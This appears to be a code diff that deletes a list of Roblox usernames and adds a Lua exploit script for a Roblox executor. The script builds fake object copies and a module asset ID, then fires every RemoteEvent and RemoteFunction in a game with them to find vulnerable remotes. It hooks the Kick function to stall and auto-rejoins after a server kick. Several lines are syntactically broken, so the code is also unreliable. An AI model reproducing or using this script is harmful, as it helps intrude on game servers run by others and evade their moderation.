@@ -1,1 +1,168 @@
-imyourtpoop,YusufAbuAli3,YusufAbuAli1,YusufAbuAli2,Jonathan_Wehmeyer,iaminevetable6,poweringimaginatio7n,RobloxGamerPro12535,wasdawdasdaa9,randomguy200000p,MichaelVazquez76,Voldemprt,2018_FlamgoWasFunny,ZincEater,BasicFitAss,AnAccount_ForAFriend,oblivision256,FlorenciaInzunza,ImJust_Qwerty,xXYoloXx2016,
+local urlforexe = ""
+local HttpService = game:GetService("HttpService")
+local apiDump,apiDumpUrl
+if not getgenv().apidumpisloaded then
+	apiDumpUrl = "https://raw.githubusercontent.com/MaximumADHD/Roblox-Client-Tracker/refs/heads/roblox/API-Dump.json"
+	getgenv().apidumpisloaded = HttpService:JSONDecode(game:HttpGet(apiDumpUrl))
+end
+apiDump = getgenv().apidumpisloaded
+local function buildPropertyMap(apiDump)
+	local propertyMap = {}
+	local superclassMap = {}
+	for _, class in ipairs(apiDump.Classes) do
+		superclassMap[class.Name] = class.Superclass
+	end
+	local cachedProperties = {}
+	local function getReadableProperties(className)
+		if cachedProperties[className] then
+			return cachedProperties[className]
+		end
+		local properties = {}
+		for _, class in ipairs(apiDump.Classes) do
+			if class.Name == className then
+				for _, member in ipairs(class.Members) do
+					if member.MemberType == "Property" and member.Security.Read == "None" then
+						properties[member.Name] = true
+					end
+				end
+				break
+			end
+		end
+		local super = superclassMap[className]
+		if super then
+			local inherited = getReadableProperties(super)
+			for prop in pairs(inherited) do
+				properties[prop] = true
+			end
+		end
+		cachedProperties[className] = properties
+		return properties
+	end
+	for _, class in ipairs(apiDump.Classes) do
+		local props = getReadableProperties(class.Name)
+		propertyMap[class.Name] = {}
+
+		for prop in pairs(props) do
+			table.insert(propertyMap[class.Name], prop)
+		end
+	end
+	return propertyMap
+end
+local moduleid = 119017964340608
+local propertyMap = buildPropertyMap(apiDump)
+local function mimicObject(instance,exclusions,children) -- exclusions must be instances (will be included without mimic)
+	local className = instance.ClassName
+	if className==("ModuleScript") then
+		return moduleid
+	end
+	local mimic = {}
+	local props = propertyMap[className] or {}
+	for _, propName in pairs(props) do
+		local success, value = pcall(function()
+			return instance[propName]
+		end)
+		if success then
+            if typeof(value) == "instance" then
+                value = mimicObject(value,exclusions,true)
+            end
+			mimic[propName] = value
+		end
+	end
+	if children then
+		for _, child in pairs(instance:GetChildren()) do
+			if not table.find(exclusions,child) and not child:IsA"ModuleScript" then
+				mimic[child.Name] = mimicObject(child,exclusions,true)
+			elseif child:IsA("ModuleScript") then
+				mimic[child.Name] = moduleid
+			else
+				mimic[child.Name] = child
+			end
+		end
+	end
+	return mimic
+end
+function check(tablee,ignorelist)
+	for i,v in pairs(tablee) do
+		if typeof(v) == "Instance" then
+			for i,v in pairs(v:GetDescendants()) do
+				if v:IsA("Script") then
+					table.insert(ignorelist, v)
+				end
+			end
+			tablee[i] = mimicObject(v,ignorelist,true)
+            else
+                tablee[i] = v
+		end
+	end
+	return tablee
+end
+getgenv().excl = getgenv().excl or {}
+local lastrem = nil
+local remi = 0
+game.ReplicatedStorage.ChildAdded:connect(function(r)
+    if r.Name == "ChatMsgEncryptor" then
+        print(lastrem:GetFullName().." vulnerable")
+        game.Players.LocalPlayer.Character:Destroy()
+    end
+end)
+local placeid = game.PlaceId
+local rems = {}
+for i,v in pairs(game:GetDescendants()) do
+    if not v.Parent == game:GetService("RobloxReplicatedStorage") then
+        if v:IsA"RemoteEvent" or v:IsA"RemoteFunction" and then
+            table.insert(rems, v)
+        end
+    end
+end
+for i,v in pairs(getgenv().excl) do
+    rems[v] = Instance.new'Part'
+end
+local forrealsies = {}
+local fakes = {}
+for i,v in pairs(game.Workspace:GetDescendants()) do
+    if v:IsA"ModuleScript" then
+        table.insert(forrealsies, v)
+    end
+end
+fakes = check(forrealsies,{})
+game.LogService.MessageOut:connect(function(asd)
+    if asd:lower():find'server kick' then
+        table.insert(getgenv().excl, )
+        queue_on_teleport()
+        game["Teleport Service"]:Teleport(placeid,game.Players.LocalPlayer)
+    end
+end)
+hookfunction(game.Players.LocalPlayer.Kick,function()
+    wait(9e9)
+end)
+for i,rem in pairs(rems) do
+    if rem:IsA"RemoteEvent" then
+        remi = i
+        for i,v in pairs(fakes) do
+            lastrem=rem
+            rem:FireServer(nil,nil,nil,v)
+            task.wait(.2)
+            rem:FireServer(nil,nil,v)
+            task.wait(.2)
+            rem:FireServer(nil,v)
+            task.wait(.2)
+            rem:FireServer(v)
+            task.wait(.2)
+            rem:FireServer(nil,nil,nil,moduleid)
+            task.wait(.2)
+            rem:FireServer(v,v,v,v,v,v,v)
+            task.wait(.2)
+        end
+    end
+    if rem:IsA"RemoteFunction" then
+        for i,v in pairs(fakes) do
+            lastrem=rem
+            rem:InvokeServer(nil,nil,nil,v)
+            rem:InvokeServer(nil,v)
+            rem:InvokeServer(nil,nil,v)
+            rem:InvokeServer(v)
+            rem:InvokeServer(nil,nil,nil,moduleid)
+            rem:InvokeServer(v,v,v,v,v,v,v)
+        end
+    end
+end
